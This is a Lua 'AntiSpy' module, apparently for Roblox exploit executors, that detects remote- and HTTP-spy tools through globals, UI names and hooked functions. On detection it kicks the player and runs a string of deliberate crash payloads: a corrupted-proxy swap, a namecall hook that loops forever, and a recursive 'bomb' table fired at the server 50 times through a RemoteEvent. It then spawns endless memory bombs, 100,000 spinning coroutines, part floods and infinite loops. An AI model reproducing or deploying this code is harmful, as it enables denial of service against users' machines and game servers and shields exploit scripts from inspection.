local AntiSpy = {delay = 1}

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

function AntiSpy.Enable()
    task.spawn(function()
        while true do
            local detectedSpies = {}
            local httpSpyDetected = false
            
            local commonSpyGlobals = {
                "SimpleSpy", "SimpleSpyExecuted", "SimpleSpyShutdown",
                "RemoteSpy", "RS", "rs", "Spy",
                "Cobalt", "CobaltInitialized",
                "SirhurtSpy", "SynapseSpy", "ScriptWareSpy",
                "Hydroxide", "HydroxideRemoteSpy",
                "__KetamineShared", "CSpy"
            }

            local earlyCobaltGlobals = {
                "CobaltUI", "CobaltConfig", "CobaltLoader", "CobaltShared", "CobaltEnv"
            }
            
            local genv = getgenv()
            
            for _, globalName in ipairs(commonSpyGlobals) do
                if genv[globalName] ~= nil then
                    table.insert(detectedSpies, globalName)
                end
            end

            for _, globalName in ipairs(earlyCobaltGlobals) do
                if genv[globalName] ~= nil and not table.find(detectedSpies, globalName) then
                    table.insert(detectedSpies, "Early Cobalt: " .. globalName)
                end
            end

            if getscripts then
                pcall(function()
                    for _, script in ipairs(getscripts()) do
                        if script.Name:lower():find("cobalt") then
                            table.insert(detectedSpies, "Cobalt Script: " .. script.Name)
                        end
                    end
                end)
            end
            
            local fallbackGenv = getfenv().getgenv and getfenv().getgenv() or _G
            if fallbackGenv["__KetamineShared"] ~= nil and not table.find(detectedSpies, "__KetamineShared") then
                table.insert(detectedSpies, "__KetamineShared (_G)")
            end
            
            local spyUIKeywords = {
                "simplespy", "remotespy", "cobalt", "hydroxide", "cspy", 
                "ketamine", "rspy", "vspy", "influxspy"
            }

            local function checkForSpyUI(parent)
                for _, child in ipairs(parent:GetChildren()) do
                    local name = child.Name:lower()
                    local isSpyUI = false
                    
                    for _, keyword in ipairs(spyUIKeywords) do
                        if name == keyword or name:find("^" .. keyword) or name:find(keyword .. "$") then
                            isSpyUI = true
                            break
                        end
                    end

                    if isSpyUI then
                        table.insert(detectedSpies, "UI: " .. child.Name)
                        pcall(function() child:Destroy() end)
                    end
                    pcall(function() checkForSpyUI(child) end)
                end
            end
            
            pcall(function() checkForSpyUI(game:GetService("CoreGui")) end)
            pcall(function() 
                local pg = game:GetService("Players").LocalPlayer:FindFirstChild("PlayerGui")
                if pg then checkForSpyUI(pg) end
            end)

            if isfunctionhooked and iscclosure then
                if not iscclosure(isfunctionhooked) then
                    httpSpyDetected = true
                end
            end

            if not httpSpyDetected and getgenv then
                local env = getgenv()
                if env.Ketamine or env.KetamineLoaded or env.SpyLoaded or env.HttpSpy or env.SimpleSpyLoaded or env.SimpleSpy or env.Hydroxide then
                    httpSpyDetected = true
                end
            end

            if not httpSpyDetected and isfunctionhooked then
                local req = request or http_request or (syn and syn.request) or (http and http.request)
                if (req and isfunctionhooked(req)) or (game.HttpGet and isfunctionhooked(game.HttpGet)) then
                    httpSpyDetected = true
                end
            end

            if not httpSpyDetected and getrawmetatable then
                local success, mt = pcall(getrawmetatable, game)
                if success and mt then
                    local namecall = rawget(mt, "__namecall") or mt.__namecall
                    if namecall and isfunctionhooked and isfunctionhooked(namecall) then
                        httpSpyDetected = true
                    end
                end
            end

            if #detectedSpies > 0 or httpSpyDetected then
                print("[!] Detected potential remote or HTTP spies: " .. table.concat(detectedSpies, ", "))

                pcall(function()
                    LocalPlayer:Kick("ok skid")
                end)

                task.wait(0.2)

                for _, globalName in ipairs(commonSpyGlobals) do
                    if genv[globalName] ~= nil then
                        pcall(function()
                            local BrokenProxy = newproxy(true)
                            local mt = getmetatable(BrokenProxy)
                            mt.__index = function() return BrokenProxy end
                            mt.__newindex = function() error("Spy State Corrupted", 0) end
                            genv[globalName] = BrokenProxy
                        end)
                    end
                end

                pcall(function()
                    if fallbackGenv["__KetamineShared"] ~= nil then
                        local BrokenProxy = newproxy(true)
                        local mt = getmetatable(BrokenProxy)
                        mt.__index = function() return BrokenProxy end
                        mt.__newindex = function() error("Ketamine State Corrupted", 0) end
                        fallbackGenv["__KetamineShared"] = BrokenProxy
                    end
                end)

                pcall(function()
                    local gameMt = getrawmetatable(game)
                    local namecall = rawget(gameMt, "__namecall")
                    if isfunctionhooked and isfunctionhooked(namecall) then
                        hookfunction(namecall, function(...)
                            while true do end 
                        end)
                    end
                end)

                pcall(function()
                    local BombTable = {}
                    for i = 1, 10000 do
                        BombTable[i] = { ["Key_" .. i] = BombTable }
                    end
                    
                    local mt = {
                        __tostring = function() 
                            local function recurse() return recurse() end
                            return recurse()
                        end
                    }
                    setmetatable(BombTable, mt)

                    local DummyRemote = Instance.new("RemoteEvent")
                    DummyRemote.Name = "fuck you"
                    DummyRemote.Parent = game:GetService("ReplicatedStorage")
                    
                    task.spawn(function()
                        for i = 1, 50 do
                            pcall(function()
                                DummyRemote:FireServer(BombTable)
                            end)
                        end
                        DummyRemote:Destroy()
                    end)
                end)

                pcall(function()
                    if genv.SimpleSpy and type(genv.SimpleSpy.scheduled) == "table" then
                        for i = 1, 50000 do
                            table.insert(genv.SimpleSpy.scheduled, {
                                function() 
                                    local t = {}
                                    for j = 1, 1000 do t[j] = j end
                                end
                            })
                        end
                    end
                end)

                pcall(function()
                    task.spawn(function()
                        local memoryBomb = {}
                        local chunk = string.rep("A", 100000)
                        while true do
                            table.insert(memoryBomb, chunk)
                            local nested = {}
                            for i = 1, 500 do nested[i] = {} end
                            table.insert(memoryBomb, nested)
                        end
                    end)
                end)

                pcall(function()
                    task.spawn(function()
                        local threads = {}
                        for i = 1, 100000 do
                            local success, thread = pcall(coroutine.create, function()
                                while true do end
                            end)
                            if success then
                                threads[i] = thread
                                pcall(coroutine.resume, thread)
                            end
                        end
                    end)
                end)

                pcall(function()
                    local function createOverflowTable()
                        local t = {}
                        setmetatable(t, {
                            __index = function(self, key)
                                return createOverflowTable()
                            end,
                            __tostring = function()
                                local function recurse() return recurse() end
                                return recurse()
                            end
                        })
                        return t
                    end
                    
                    local overflow = createOverflowTable()
                    
                    if genv.SimpleSpy then
                        pcall(function() 
                            if genv.SimpleSpy.AddLog then 
                                genv.SimpleSpy:AddLog(overflow) 
                            end
                        end)
                    end
                    
                    if genv.Hydroxide then
                        pcall(function()
                            tostring(overflow)
                        end)
                    end
                end)

                pcall(function()
                    task.spawn(function()
                        local folder = Instance.new("Folder")
                        folder.Name = "AntiSpy_Flood"
                        folder.Parent = game:GetService("ReplicatedStorage")
                        
                        for i = 1, 50000 do
                            pcall(function()
                                local part = Instance.new("Part")
                                part.Anchored = true
                                part.CanCollide = false
                                part.Transparency = 1
                                part.Parent = folder
                            end)
                            if i % 500 == 0 then task.wait() end
                        end
                        
                        pcall(function() folder:Destroy() end)
                    end)
                end)

                pcall(function()
                    task.spawn(function()
                        local function dummyFunc()
                            return debug.traceback()
                        end
                        
                        while true do
                            pcall(function()
                                local info = debug.getinfo(dummyFunc)
                                for i = 1, 10000 do
                                    debug.getinfo(i)
                                end
                            end)
                        end
                    end)
                end)

                while true do end
            end

            task.wait(AntiSpy.delay)
        end
    end)
end

return AntiSpy
